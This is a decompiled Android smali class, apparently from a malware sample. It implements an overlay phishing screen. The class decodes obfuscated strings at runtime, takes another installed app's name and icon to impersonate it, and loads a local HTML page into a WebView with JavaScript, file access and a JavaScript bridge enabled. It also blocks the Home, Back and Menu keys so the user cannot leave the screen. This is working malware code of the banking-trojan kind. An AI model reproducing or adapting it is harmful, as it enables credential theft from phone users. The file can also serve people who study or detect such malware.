.class public Lcom/vknnolqo/p9sv5zvf/JB4M6sys;
.super Landroid/app/Activity;
.source "SourceFile"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/vknnolqo/p9sv5zvf/JB4M6sys$d;,
        Lcom/vknnolqo/p9sv5zvf/JB4M6sys$b;,
        Lcom/vknnolqo/p9sv5zvf/JB4M6sys$c;
    }
.end annotation


# instance fields
.field b:Landroid/webkit/WebView;

.field c:Ljava/lang/String;

.field d:Landroid/content/Context;

.field private e:Z

.field private f:Z


# direct methods
.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/vknnolqo/p9sv5zvf/JB4M6sys;->e:Z

    iput-boolean v0, p0, Lcom/vknnolqo/p9sv5zvf/JB4M6sys;->f:Z

    return-void
.end method

.method static synthetic a(Lcom/vknnolqo/p9sv5zvf/JB4M6sys;Z)Z
    .locals 0

    .line 1
    iput-boolean p1, p0, Lcom/vknnolqo/p9sv5zvf/JB4M6sys;->e:Z

    return p1
.end method


# virtual methods
.method public onBackPressed()V
    .locals 1

    :try_start_0
    iget-object v0, p0, Lcom/vknnolqo/p9sv5zvf/JB4M6sys;->b:Landroid/webkit/WebView;

    if-eqz v0, :cond_0

    invoke-virtual {v0}, Landroid/webkit/WebView;->canGoBack()Z

    move-result v0

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/vknnolqo/p9sv5zvf/JB4M6sys;->b:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->goBack()V

    goto :goto_0

    :cond_0
    invoke-super {p0}, Landroid/app/Activity;->onBackPressed()V
    :try_end_0
    .catch Ljava/lang/NullPointerException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    invoke-super {p0}, Landroid/app/Activity;->onBackPressed()V

    :goto_0
    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 8

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    iput-object p1, p0, Lcom/vknnolqo/p9sv5zvf/JB4M6sys;->d:Landroid/content/Context;

    const/4 p1, 0x0

    iput-boolean p1, p0, Lcom/vknnolqo/p9sv5zvf/JB4M6sys;->f:Z

    invoke-virtual {p0}, Landroid/app/Activity;->getIntent()Landroid/content/Intent;

    move-result-object v0

    const/4 v1, 0x5

    :try_start_0
    new-array v2, v1, [B

    fill-array-data v2, :array_0

    const/16 v3, 0x8

    new-array v4, v3, [B

    fill-array-data v4, :array_1

    invoke-static {v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    iput-object v2, p0, Lcom/vknnolqo/p9sv5zvf/JB4M6sys;->c:Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_3

    const/4 v4, 0x0

    const/4 v5, 0x4

    :try_start_1
    new-array v6, v5, [B

    fill-array-data v6, :array_2

    new-array v7, v3, [B

    fill-array-data v7, :array_3

    invoke-static {v6, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v0, v6}, Landroid/content/Intent;->hasExtra(Ljava/lang/String;)Z

    move-result v6

    if-eqz v6, :cond_0

    new-array v1, v1, [B

    fill-array-data v1, :array_4

    new-array v6, v3, [B

    fill-array-data v6, :array_5

    invoke-static {v1, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p0, v1}, Landroid/app/Activity;->setTitle(Ljava/lang/CharSequence;)V

    new-array v5, v5, [B

    fill-array-data v5, :array_6

    new-array v6, v3, [B

    fill-array-data v6, :array_7

    invoke-static {v5, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Landroid/content/Intent;->getByteArrayExtra(Ljava/lang/String;)[B

    move-result-object v0

    array-length v5, v0

    invoke-static {v0, p1, v5}, Landroid/graphics/BitmapFactory;->decodeByteArray([BII)Landroid/graphics/Bitmap;

    move-result-object v0

    new-instance v5, Landroid/app/ActivityManager$TaskDescription;

    invoke-direct {v5, v1, v0}, Landroid/app/ActivityManager$TaskDescription;-><init>(Ljava/lang/String;Landroid/graphics/Bitmap;)V

    invoke-virtual {p0, v5}, Landroid/app/Activity;->setTaskDescription(Landroid/app/ActivityManager$TaskDescription;)V

    goto :goto_0

    :cond_0
    const/16 v0, 0x12

    new-array v0, v0, [B

    fill-array-data v0, :array_8

    new-array v1, v3, [B

    fill-array-data v1, :array_9

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cg0;->x(Ljava/lang/String;Landroid/content/pm/PackageManager;)Z

    move-result v1

    if-nez v1, :cond_1

    const/16 v0, 0x13

    new-array v0, v0, [B

    fill-array-data v0, :array_a

    new-array v1, v3, [B

    fill-array-data v1, :array_b

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cg0;->x(Ljava/lang/String;Landroid/content/pm/PackageManager;)Z

    move-result v1

    if-nez v1, :cond_1

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cg0;->v(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cg0;->x(Ljava/lang/String;Landroid/content/pm/PackageManager;)Z

    move-result v1

    if-nez v1, :cond_1

    move-object v0, v4

    :cond_1
    if-eqz v0, :cond_2

    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    invoke-virtual {v1, v0, p1}, Landroid/content/pm/PackageManager;->getApplicationInfo(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;

    move-result-object v0

    invoke-virtual {v1, v0}, Landroid/content/pm/PackageManager;->getApplicationIcon(Landroid/content/pm/ApplicationInfo;)Landroid/graphics/drawable/Drawable;

    move-result-object v5

    invoke-virtual {v1, v0}, Landroid/content/pm/PackageManager;->getApplicationLabel(Landroid/content/pm/ApplicationInfo;)Ljava/lang/CharSequence;

    move-result-object v0

    invoke-interface {v0}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Landroid/app/Activity;->setTitle(Ljava/lang/CharSequence;)V

    invoke-static {v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cg0;->q(Landroid/graphics/drawable/Drawable;)Landroid/graphics/Bitmap;

    move-result-object v0

    new-instance v1, Landroid/app/ActivityManager$TaskDescription;

    const-string v5, " "

    invoke-direct {v1, v5, v0}, Landroid/app/ActivityManager$TaskDescription;-><init>(Ljava/lang/String;Landroid/graphics/Bitmap;)V

    invoke-virtual {p0, v1}, Landroid/app/Activity;->setTaskDescription(Landroid/app/ActivityManager$TaskDescription;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    :catch_0
    :cond_2
    :goto_0
    :try_start_2
    new-instance v0, Landroid/webkit/WebView;

    invoke-direct {v0, p0}, Landroid/webkit/WebView;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/vknnolqo/p9sv5zvf/JB4M6sys;->b:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setDomStorageEnabled(Z)V

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setAllowFileAccess(Z)V

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setAllowContentAccess(Z)V

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setLoadsImagesAutomatically(Z)V

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setLoadWithOverviewMode(Z)V

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setUseWideViewPort(Z)V

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setCacheMode(I)V

    invoke-virtual {v0, p1}, Landroid/webkit/WebSettings;->setBuiltInZoomControls(Z)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    :try_start_3
    invoke-static {}, Landroid/webkit/CookieManager;->getInstance()Landroid/webkit/CookieManager;

    move-result-object p1

    invoke-virtual {p1, v1}, Landroid/webkit/CookieManager;->setAcceptCookie(Z)V

    invoke-static {}, Landroid/webkit/CookieManager;->getInstance()Landroid/webkit/CookieManager;

    move-result-object p1

    iget-object v0, p0, Lcom/vknnolqo/p9sv5zvf/JB4M6sys;->b:Landroid/webkit/WebView;

    invoke-virtual {p1, v0, v1}, Landroid/webkit/CookieManager;->setAcceptThirdPartyCookies(Landroid/webkit/WebView;Z)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    :catch_1
    :try_start_4
    iget-object p1, p0, Lcom/vknnolqo/p9sv5zvf/JB4M6sys;->b:Landroid/webkit/WebView;

    new-instance v0, Lcom/vknnolqo/p9sv5zvf/JB4M6sys$d;

    invoke-direct {v0, p0, p0}, Lcom/vknnolqo/p9sv5zvf/JB4M6sys$d;-><init>(Lcom/vknnolqo/p9sv5zvf/JB4M6sys;Landroid/content/Context;)V

    const/4 v1, 0x7

    new-array v1, v1, [B

    fill-array-data v1, :array_c

    new-array v5, v3, [B

    fill-array-data v5, :array_d

    invoke-static {v1, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p1, v0, v1}, Landroid/webkit/WebView;->addJavascriptInterface(Ljava/lang/Object;Ljava/lang/String;)V

    iget-object p1, p0, Lcom/vknnolqo/p9sv5zvf/JB4M6sys;->b:Landroid/webkit/WebView;

    new-instance v0, Lcom/vknnolqo/p9sv5zvf/JB4M6sys$b;

    invoke-direct {v0, p0}, Lcom/vknnolqo/p9sv5zvf/JB4M6sys$b;-><init>(Lcom/vknnolqo/p9sv5zvf/JB4M6sys;)V

    invoke-virtual {p1, v0}, Landroid/webkit/WebView;->setWebChromeClient(Landroid/webkit/WebChromeClient;)V

    iget-object p1, p0, Lcom/vknnolqo/p9sv5zvf/JB4M6sys;->b:Landroid/webkit/WebView;

    new-instance v0, Lcom/vknnolqo/p9sv5zvf/JB4M6sys$c;

    invoke-direct {v0, p0, v4}, Lcom/vknnolqo/p9sv5zvf/JB4M6sys$c;-><init>(Lcom/vknnolqo/p9sv5zvf/JB4M6sys;Lcom/vknnolqo/p9sv5zvf/JB4M6sys$a;)V

    invoke-virtual {p1, v0}, Landroid/webkit/WebView;->setWebViewClient(Landroid/webkit/WebViewClient;)V

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    invoke-static {p1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cg0;->r(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    new-instance v0, Ljava/io/File;

    invoke-virtual {p0}, Landroid/content/Context;->getFilesDir()Ljava/io/File;

    move-result-object v1

    invoke-direct {v0, v1, p1}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result p1

    if-eqz p1, :cond_3

    iget-object p1, p0, Lcom/vknnolqo/p9sv5zvf/JB4M6sys;->b:Landroid/webkit/WebView;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    new-array v2, v3, [B

    fill-array-data v2, :array_e

    new-array v3, v3, [B

    fill-array-data v3, :array_f

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    iget-object p1, p0, Lcom/vknnolqo/p9sv5zvf/JB4M6sys;->b:Landroid/webkit/WebView;

    invoke-virtual {p0, p1}, Landroid/app/Activity;->setContentView(Landroid/view/View;)V

    goto :goto_1

    :cond_3
    invoke-virtual {p0}, Landroid/app/Activity;->finish()V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_2

    :catch_2
    :goto_1
    return-void

    :catch_3
    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    return-void

    nop

    :array_0
    .array-data 1
        -0x44t
        -0x3t
        -0x1et
        -0x66t
        0x56t
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x21t
        -0x78t
        -0x68t
        -0xdt
        0x32t
        -0x70t
        -0x1ct
        -0x35t
    .end array-data

    :array_2
    .array-data 1
        0x7dt
        -0x2ct
        0x5dt
        -0x14t
    .end array-data

    :array_3
    .array-data 1
        0x14t
        -0x49t
        0x32t
        -0x7et
        -0x35t
        0x62t
        -0x2et
        0x6et
    .end array-data

    :array_4
    .array-data 1
        0x4t
        0x76t
        -0x44t
        0x49t
        -0x4at
    .end array-data

    nop

    :array_5
    .array-data 1
        0x68t
        0x17t
        -0x22t
        0x2ct
        -0x26t
        -0x26t
        -0x1at
        -0x6dt
    .end array-data

    :array_6
    .array-data 1
        -0x1at
        0x62t
        0x42t
        0x8t
    .end array-data

    :array_7
    .array-data 1
        -0x71t
        0x1t
        0x2dt
        0x66t
        -0x31t
        0x1et
        0x77t
        -0x4ft
    .end array-data

    :array_8
    .array-data 1
        -0x32t
        -0x4et
        0x3dt
        0xdt
        -0x48t
        0x5ft
        -0x5bt
        -0x3bt
        -0x3et
        -0x4ct
        0x34t
        0xdt
        -0x46t
        0x59t
        -0x4dt
        -0x28t
        -0x40t
        -0x48t
    .end array-data

    nop

    :array_9
    .array-data 1
        -0x53t
        -0x23t
        0x50t
        0x23t
        -0x27t
        0x31t
        -0x3ft
        -0x49t
    .end array-data

    :array_a
    .array-data 1
        0x6at
        0x42t
        0x52t
        -0x3ct
        -0x31t
        0x7bt
        0xdt
        -0x5at
        0x66t
        0x44t
        0x5bt
        -0x3ct
        -0x28t
        0x70t
        0x7t
        -0x50t
        0x60t
        0x43t
        0x58t
    .end array-data

    :array_b
    .array-data 1
        0x9t
        0x2dt
        0x3ft
        -0x16t
        -0x52t
        0x15t
        0x69t
        -0x2ct
    .end array-data

    :array_c
    .array-data 1
        0x68t
        0x2t
        -0x12t
        -0x22t
        0x13t
        0x22t
        0x27t
    .end array-data

    :array_d
    .array-data 1
        0x29t
        0x6ct
        -0x76t
        -0x54t
        0x7ct
        0x4bt
        0x43t
        -0x2t
    .end array-data

    :array_e
    .array-data 1
        -0x18t
        -0x11t
        0x38t
        -0x77t
        0x34t
        0x56t
        -0x9t
        -0x68t
    .end array-data

    :array_f
    .array-data 1
        -0x72t
        -0x7at
        0x54t
        -0x14t
        0xet
        0x79t
        -0x28t
        -0x49t
    .end array-data
.end method

.method protected onDestroy()V
    .locals 3

    invoke-super {p0}, Landroid/app/Activity;->onDestroy()V

    iget-object v0, p0, Lcom/vknnolqo/p9sv5zvf/JB4M6sys;->c:Ljava/lang/String;

    if-eqz v0, :cond_0

    iget-boolean v1, p0, Lcom/vknnolqo/p9sv5zvf/JB4M6sys;->e:Z

    if-nez v1, :cond_0

    sget-object v1, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->e:Ljava/util/Map;

    sget-object v2, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-interface {v1, v0, v2}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    :cond_0
    return-void
.end method

.method public onKeyDown(ILandroid/view/KeyEvent;)Z
    .locals 0

    const/4 p2, 0x3

    if-eq p1, p2, :cond_1

    const/4 p2, 0x4

    if-eq p1, p2, :cond_1

    const/16 p2, 0x52

    if-ne p1, p2, :cond_0

    goto :goto_0

    :cond_0
    const/4 p1, 0x0

    goto :goto_1

    :cond_1
    :goto_0
    const/4 p1, 0x1

    :goto_1
    return p1
.end method
